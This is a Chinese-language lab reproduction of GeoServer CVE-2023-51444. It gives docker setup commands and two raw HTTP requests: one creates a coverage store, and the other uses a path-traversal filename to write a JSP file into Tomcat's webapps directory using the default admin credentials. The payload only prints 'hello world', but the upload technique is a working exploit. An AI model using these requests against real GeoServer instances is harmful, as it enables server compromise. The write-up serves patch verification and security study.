# GeoServer 任意文件上传漏洞 CVE-2023-51444

​	GeoServer是一个开源服务器，用于共享、处理和编辑地理空间数据。它支持多种地图和数据标准，使用户能够通过网络访问和操作地理信息系统（GIS）数据。GeoServer 是开放地理空间联盟 (OGC) Web 要素服务 (WFS) 和 Web 覆盖服务 (WCS) 标准的参考实现，以及高性能认证的兼容 Web 地图服务 (WMS)、兼容的 Web 目录服务 ( CSW）并实施网络处理服务（WPS）。 GeoServer 构成了地理空间网络的核心组件。

​	在2.23.4版本之前和2.24.1版本之前存在一个任意文件上传漏洞，允许经过身份验证的管理员通过REST Coverage Store API修改覆盖存储器权限上传任意文件内容到任意文件位置。漏洞利用需要管理员权限。



GeoServer官网 https://geoserver.org/

项目github地址https://github.com/geoserver/geoserver



参考链接

- https://github.com/geoserver/geoserver/security/advisories/GHSA-9v5q-2gwq-q9hq
- https://github.com/geoserver/geoserver/pull/7222/files
- https://blog.csdn.net/shelter1234567/article/details/138637541

**受影响的版本**

<2.23.4，<2.24.1



## 漏洞环境

执行如下命令启动一个geoserver-v2.24.0：

```shell
sudo docker pull docker.osgeo.org/geoserver:2.24.0

sudo docker run -it -p8080:8080 docker.osgeo.org/geoserver:2.24.0
```



## 漏洞复现

1，登录查看数据目录

![image-20240509114322749](./1.png)



2，创建coverageStore 为test, 及定义url路径为绝对路径（第一步收集到的数据目录信息），

```
POST /geoserver/rest/workspaces/sf/coveragestores?configure=all HTTP/1.1
Host: 192.168.160.128:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36
Connection: close
Content-Length: 352
Authorization: Basic YWRtaW46Z2Vvc2VydmVy
Content-Type: text/xml
Cookie: JSESSIONID=BA9BAFE1A0F1BF6857DF2E9FF57824B7
Accept-Encoding: gzip, deflate, br

<coverageStore>
  <name>test</name>
  <type>ImageMosaic</type>
  <enabled>true</enabled>
  <workspace>
    <name>sf</name>
  </workspace>
  <__default>false</__default>
  <dateCreated>2024-05-9 11:00:00.000 UTC</dateCreated>
  <disableOnConnFailure>false</disableOnConnFailure>
  <url>file:/opt/geoserver_data/data/sf/</url>
</coverageStore>
```

返回状态201表示成功

![image-20240509114812864](./2.png)

3，上传文件

注意接口定义(这里上源码提示)

```java
@RequestMapping(
        path =
                RestBaseController.ROOT_PATH
                        + "/workspaces/{workspaceName}/coveragestores/{storeName}/{method}.{format}")
```

workspaceName我们选择sf此为系统自带，storeName就是我们第二步创建的coverageStore ，apache-tomcat-9.0.82为此次docker的目录tomcat的父路径，如果你想访问这个jsp的话此为必选项，

```jsp
POST /geoserver/rest/workspaces/sf/coveragestores/test/file.imagemosaic?filename=../../../apache-tomcat-9.0.82/webapps/test/print.jsp HTTP/1.1
Host: 192.168.160.128:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36
Connection: close
Content-Length: 33
Authorization: Basic YWRtaW46Z2Vvc2VydmVy
Content-Type: application/octet-stream
Cookie: JSESSIONID=BA9BAFE1A0F1BF6857DF2E9FF57824B7
Accept-Encoding: gzip, deflate, br

<% out.println("hello world"); %>
```

返回202代表上传成功

![image-20240509115328282](./3.png)

访问验证

![image-20240509115419261](./4.png)